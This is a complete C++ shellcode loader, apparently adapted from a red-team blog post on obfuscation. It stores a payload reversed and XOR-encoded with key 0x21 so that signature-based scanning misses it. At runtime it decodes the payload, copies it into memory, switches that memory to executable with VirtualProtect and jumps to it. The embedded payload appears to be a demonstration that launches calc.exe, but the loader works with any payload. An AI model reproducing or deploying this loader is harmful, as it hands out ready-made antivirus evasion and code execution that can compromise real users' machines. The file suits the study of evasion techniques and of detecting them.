/*
* Title: Shellcode Obfuscation: FlipXOR
* Resources:
*   - https://redsiege.com/blog/2024/08/adventures-in-shellcode-obfuscation-part-7-flipping-the-script/
*/
#include <Windows.h>
#include <iostream>

#define XOR_KEY 0x21

VOID FlipXOR(unsigned char* encodedShellcode, size_t shellcodeLen, unsigned char* shellcode) {
    for (int i = 0; i < shellcodeLen; i++) {
        // We need to reverse operation.
        shellcode[i] = encodedShellcode[shellcodeLen - i - 1] ^ XOR_KEY;
    }
}

int main() {
    // This encoded shellcode was generated with FlipXOR.py
    unsigned char encodedShellcode[] =
        "\x21\x44\x59\x44\x0f\x42\x4d\x40\x42\xf4\xde\xfb"
        "\xa8\x60\x78\x21\x4b\x4e\x53\x32\x66\x9a\x24\x54"
        "\xc1\xda\xa1\x2b\x5d\x27\x1d\x09\xe5\xa2\x69\xf4"
        "\xde\xbc\x9c\xb4\x87\x9b\x60\x77\x83\x94\xd1\x9a"
        "\xf4\xde\xa6\x4e\xaa\x10\x9b\x60\x21\x21\x20\x20"
        "\xac\xac\x69\x21\x21\x21\x21\x21\x21\x21\x20\x9b"
        "\x69\x7c\xde\xde\xde\x76\xc8\x33\xaa\x69\x7b\x78"
        "\x60\x79\xc1\xde\x73\x60\x01\xcd\xa2\x69\x7b\x60"
        "\x78\x60\x79\x60\x7b\x78\x7f\x79\x60\x79\x60\xf1"
        "\x20\x69\xa9\x25\xaa\x60\xf1\x20\x68\x3d\x61\xaa"
        "\x65\x69\x2d\xaa\x60\x47\xf1\x20\x68\x05\x61\xaa"
        "\x65\x79\xf9\x54\xf0\x18\x64\x29\x05\x6d\x22\x6d"
        "\xd0\x54\xc1\x19\xe0\x20\x60\x2c\xe8\xe0\x60\x8d"
        "\xe1\x10\x69\xe8\x10\x6c\xf7\x20\x69\xa9\x15\xaa"
        "\x60\xe8\xde\x69\x77\xc2\xf1\x20\x68\x01\x61\xaa"
        "\x65\x39\x69\xaa\x71\xf1\x20\x69\x46\x55\xe1\xa4"
        "\x69\x21\x21\x21\xa9\xa1\xaa\xf1\x20\x69\x1d\x63"
        "\xaa\x01\x73\xaa\x69\x70\x60\x73\xcc\xc3\xe0\x20"
        "\x60\x2c\xe8\xe0\x60\x01\x0d\x23\x5d\x40\x1d\x8d"
        "\xe1\x10\x69\xe8\x10\x6c\x6b\x6b\x96\x2e\x69\x71"
        "\x53\xaa\x69\x01\x73\xaa\x69\x39\x73\xaa\x69\x41"
        "\x73\xaa\x69\x44\xf3\x10\x69\x77\x70\x73\x71\x60"
        "\x70\x60\x21\x21\x21\xe1\xc9\xd1\xc5\xa2\x69\xdd";

    // Decode the shellcode.
    const size_t shellcodeLen = sizeof(encodedShellcode) - 1;
    unsigned char shellcode[shellcodeLen] = {};
    FlipXOR(encodedShellcode, shellcodeLen, shellcode);

    // -----------------------------------------------------------------------------
    // The following code is the Shellcode Injection example.
    // -----------------------------------------------------------------------------

    LPVOID lpExec = VirtualAlloc(0, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!lpExec) return FALSE;

    memcpy(lpExec, shellcode, sizeof(shellcode));

    DWORD dwOldProtect = 0;
    if (!VirtualProtect(lpExec, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        VirtualFree(lpExec, 0, MEM_RELEASE);
        return FALSE;
    }

    ((void(*)())lpExec)();

    return 0;
}